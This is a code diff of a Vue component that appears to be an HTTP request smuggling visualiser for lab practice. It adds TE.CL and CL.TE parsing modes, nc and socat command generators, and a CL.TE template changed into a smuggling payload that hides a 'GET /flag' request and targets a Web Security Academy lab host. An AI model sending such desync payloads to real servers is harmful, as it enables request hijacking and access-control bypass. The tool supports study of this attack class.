@@ -9,6 +9,8 @@ import { computed, ref } from 'vue'
 enum ProcessingMode {
   TE = 'te',
   CL = 'cl',
+  TECL = 'tecl',
+  CLTE = 'clte',
 }
 
 const server1Mode = ref<ProcessingMode>(ProcessingMode.TE)
@@ -19,26 +21,23 @@ const colors = ['lightpink', 'lightgreen', 'lightblue', 'lightyellow', 'lightora
 const fontColors = ['black', 'black', 'black', 'black', 'black', 'black', 'black', 'black']
 const cmdHostname = ref<string>('example.com')
 const cmdPort = ref<string>('80')
-const commandLine = computed(() => `echo -n '${input.value.replace(/'/g, `'"'"'`).replace(/\n/g, '\\r\\n')}' | nc ${cmdHostname.value} ${cmdPort.value}`)
+const cmdNc = computed(() => `printf '${input.value.replace(/'/g, `'"'"'`).replace(/\n/g, '\\r\\n')}' | nc ${cmdHostname.value} ${cmdPort.value}`)
+const cmdSocat = computed(() => `printf '${input.value.replace(/'/g, `'"'"'`).replace(/\n/g, '\\r\\n')}' | socat - OPENSSL:${cmdHostname.value}:${cmdPort.value},verify=0`)
 
 const decLength = computed(() => sizeCalcInput.value.replace(/\n/g, '\r\n').length)
 const hexLength = computed(() => sizeCalcInput.value.replace(/\n/g, '\r\n').length.toString(16))
 
-const clteTemplate = `GET / HTTP/1.1
+const clteTemplate = `POST / HTTP/1.1
+Host: 0ada007003e1c1b78832d43d0020006c.web-security-academy.net
 Transfer-Encoding: chunked
-Content-Length: 61
+Content-Length: 36
 
 0
 
 GET /flag HTTP/1.1
-Transfer-Encoding: chunked
+X-Ignore: XGET / HTTP/1.1
+Host: 0ada007003e1c1b78832d43d0020006c.web-security-academy.net
 
-28
-
-GET / HTTP/1.1
-Content-Length: 1
-
-0
 `
 
 const teclTemplate = `GET / HTTP/1.1
@@ -85,21 +84,83 @@ function process(x: string, mode: ProcessingMode): string[] {
     switch (state) {
       case State.Header: {
         const idx = x.indexOf('\r\n\r\n')
+        if (idx === -1) {
+          buf += x + '<em>Error: no CRLFCRLF found while reading headers</em>'
+          x = ''
+          break
+        }
         buf += x.slice(0, idx + 4)
         x = x.slice(idx + 4)
         state = State.Body
         break
       }
       case State.Body: {
-        switch (mode) {
-          case ProcessingMode.TE: {
-            if (buf.toLowerCase().indexOf('transfer-encoding: ') === -1) {
-              buf += '<em>Error: Transfer-Encoding header not found for TE mode</em>'
+        let effectiveMode: ProcessingMode | undefined = mode
+        switch(mode) {
+          case ProcessingMode.TECL: {
+            if (buf.toLowerCase().indexOf('transfer-encoding: ') !== -1) {
+              effectiveMode = ProcessingMode.TE
+            } else if (buf.toLowerCase().indexOf('content-length: ') !== -1) {
+              effectiveMode = ProcessingMode.CL
+            } else {
+              if (!buf.startsWith('GET ')) {
+                buf += '<em>Error: Transfer-Encoding nor Content-Length header not found for TECL mode</em>'
+              }
               rv.push(buf)
               buf = ''
               state = State.Header
-              break
+              effectiveMode = undefined
             }
+            break
+          }
+          case ProcessingMode.CLTE: {
+            if (buf.toLowerCase().indexOf('content-length: ') !== -1) {
+              effectiveMode = ProcessingMode.CL
+            } else if (buf.toLowerCase().indexOf('transfer-encoding: ') !== -1) {
+              effectiveMode = ProcessingMode.TE
+            } else {
+              if (!buf.startsWith('GET ')) {
+                buf += '<em>Error: Transfer-Encoding nor Content-Length header not found for CLTE mode</em>'
+              }
+              rv.push(buf)
+              buf = ''
+              state = State.Header
+              effectiveMode = undefined
+            }
+            break
+          }
+          case ProcessingMode.TE: {
+            if (buf.toLowerCase().indexOf('transfer-encoding: ') === -1) {
+              if (!buf.startsWith('GET ')) {
+                buf += '<em>Error: Transfer-Encoding header not found for TE mode</em>'
+              }
+              rv.push(buf)
+              buf = ''
+              state = State.Header
+              effectiveMode = undefined
+            }
+            break
+          }
+          case ProcessingMode.CL: {
+            if (buf.toLowerCase().indexOf('content-length: ') === -1) {
+              if (!buf.startsWith('GET ')) {
+                buf += '<em>Error: Content-Length header not found for CL mode</em>'
+              }
+              rv.push(buf)
+              buf = ''
+              state = State.Header
+              effectiveMode = undefined
+            }
+            break
+          }
+        }
+
+        if (!effectiveMode) {
+          break
+        }
+
+        switch (effectiveMode) {
+          case ProcessingMode.TE: {
             const idx = x.indexOf('\r\n')
             const len = parseInt(x.slice(0, idx), 16)
             if (isNaN(len)) {
@@ -130,13 +191,7 @@ function process(x: string, mode: ProcessingMode): string[] {
 
           case ProcessingMode.CL: {
             const idx = buf.toLowerCase().indexOf('content-length: ')
-            if (idx === -1) {
-              buf += '<em>Error: Content-Length header not found for CL mode</em>'
-              rv.push(buf)
-              buf = ''
-              state = State.Header
-              break
-            }
+            console.assert(idx !== -1)
             const len = parseInt(buf.slice(idx).split('\r\n')[0].split(/\s+/)[1])
             buf += x.slice(0, len)
             x = x.slice(len)
@@ -147,7 +202,7 @@ function process(x: string, mode: ProcessingMode): string[] {
           }
 
           default:
-            throw new Error('Invalid mode')
+            throw new Error(`Invalid mode ${effectiveMode}`)
         }
         break
       }
@@ -166,6 +221,7 @@ function process(x: string, mode: ProcessingMode): string[] {
 function processThenFormat(input: string, mode: ProcessingMode): string {
   try {
     return process(input, mode)
+      .map((part) => part.replace(/\r/g, '<span style="color: gray">\\r</span>').replace(/\n/g, '<span style="color: gray">\\n</span>\n'))
       .map((part, i) => `<span style="background-color: ${colors[i % colors.length]}; color: ${fontColors[i % fontColors.length]}">${part}</span>`)
       .join('')
   } catch (e) {
@@ -174,8 +230,10 @@ function processThenFormat(input: string, mode: ProcessingMode): string {
 }
 
 const modeOptions = [
-  { name: 'TE (Follow Transfer-Encoding)', value: ProcessingMode.TE },
-  { name: 'CL (Follow Content-Length)', value: ProcessingMode.CL },
+  { name: 'TE (Follow Transfer-Encoding only)', value: ProcessingMode.TE },
+  { name: 'CL (Follow Content-Length only)', value: ProcessingMode.CL },
+  { name: 'TECL (Prefer Transfer-Encoding; then follow Content-Length)', value: ProcessingMode.TECL },
+  { name: 'CLTE (Prefer Content-Length; then follow Transfer-Encoding)', value: ProcessingMode.CLTE },
 ]
 const server1Result = computed(() => processThenFormat(input.value, server1Mode.value))
 const server2Result = computed(() => processThenFormat(input.value, server2Mode.value))
@@ -245,8 +303,10 @@ setTeclTemplate()
         <InputText placeholder="Port" v-model="cmdPort" />
       </div>
     </div>
-    <pre style="background-color: #eee; padding: 0.5rem; max-width: 100%; white-space: normal; overflow-wrap: break-word;">{{ commandLine }}</pre>
-    <small style="font-family: sans-serif">Tip: use <code>socat</code> for SSL</small>
+    <small style="font-family: sans-serif;">nc (HTTP)</small>
+    <pre style="background-color: #eee; padding: 0.5rem; max-width: 100%; white-space: normal; overflow-wrap: break-word;">{{ cmdNc }}</pre>
+    <small style="font-family: sans-serif;">socat (HTTPS)</small>
+    <pre style="background-color: #eee; padding: 0.5rem; max-width: 100%; white-space: normal; overflow-wrap: break-word;">{{ cmdSocat }}</pre>
   </Fieldset>
 </template>
 
